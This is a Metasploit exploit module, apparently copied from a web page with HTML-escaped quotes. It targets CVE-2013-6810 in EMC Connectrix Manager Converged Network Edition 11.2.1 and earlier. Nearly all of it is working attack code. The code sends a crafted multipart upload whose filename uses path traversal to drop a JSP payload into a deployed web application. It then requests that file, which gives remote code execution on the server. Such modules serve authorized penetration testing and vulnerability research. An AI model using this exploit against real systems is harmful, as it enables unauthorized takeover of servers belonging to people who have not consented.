 
class MetasploitModule < Msf::Exploit::Remote
    Rank = GreatRanking
 
    include Msf::Exploit::Remote::HttpClient
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;EMC CMCNE Inmservlets.war FileUploadController Remote Code Execution&#039;,
            &#039;Description&#039;    => %q{
                This module exploits a file upload vulnerability found in EMC
                Connectrix Manager Converged Network Edition <= 11.2.1. The file
                upload vulnerability is triggered when sending a specially crafted
                filename to the FileUploadController servlet found within the 
                Inmservlets.war archive. This allows the attacker to upload a
                specially crafted file which leads to remote code execution in the
                context of the server user.
            },
            &#039;Author&#039;         => [ &#039;james fitts&#039; ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;References&#039;     =>
                [
                    [ &#039;ZDI&#039;, &#039;13-280&#039; ],
                    [ &#039;CVE&#039;, &#039;2013-6810&#039; ]
                ],
            &#039;Privileged&#039;    => true,
            &#039;Platform&#039;  => &#039;win&#039;,
            &#039;Arch&#039;  => ARCH_JAVA,
            &#039;Targets&#039;   =>
                [
                    [ &#039;EMC CMCNE 11.2.1 / Windows Server 2003 SP2 &#039;, {} ],
                ],
            &#039;DefaultTarget&#039;  => 0,
            &#039;DisclosureDate&#039; => &#039;Dec 18 2013&#039;))
 
        register_options([
            Opt::RPORT(80)
        ], self.class)
    end
 
    def exploit
 
        peer = "#{datastore[&#039;RHOST&#039;]}:#{datastore[&#039;RPORT&#039;]}"
        deploy = "..\\..\\..\\deploy\\dcm-client.war\\"
        jsp = payload.encoded.gsub(/\x0d\x0a/, "").gsub(/\x0a/, "")
        @jsp_name = "#{rand_text_alphanumeric(4 + rand(32-4))}.jsp"
 
        data = Rex::MIME::Message.new
        data.add_part("#{jsp}", nil, nil, "form-data; name=\"ftproot\"; filename=\"#{deploy}#{@jsp_name}\"")
 
        post_data = data.to_s.gsub(/^\r\n\-\-\_Part\_/, "--_Part_")
 
        print_status("#{peer} - Uploading the JSP Payload...")
        res = send_request_cgi({
            &#039;method&#039;    => &#039;POST&#039;,
            &#039;uri&#039;       => normalize_uri("inmservlets", "FileUploadController"),
            &#039;ctype&#039;     => "multipart/form-data; boundary=#{data.bound}",
            &#039;data&#039;      => post_data,
            &#039;headers&#039;   => {
                &#039;ROOTDIR&#039;   => "ftproot"
            }
        })
 
        if res.code == 200 and res.body =~ /SUCCESSFULLY UPLOADED FILES!/
            print_good("File uploaded successfully!")
            print_status("Executing &#039;#{@jsp_name}&#039; now...")
            res = send_request_cgi({
                &#039;method&#039;    => &#039;GET&#039;,
                &#039;uri&#039;       => normalize_uri("dcm-client", "#{@jsp_name}")
            })
        else
            print_error("Does not look like the files were uploaded to #{peer}...")
        end
 
    end
 
end

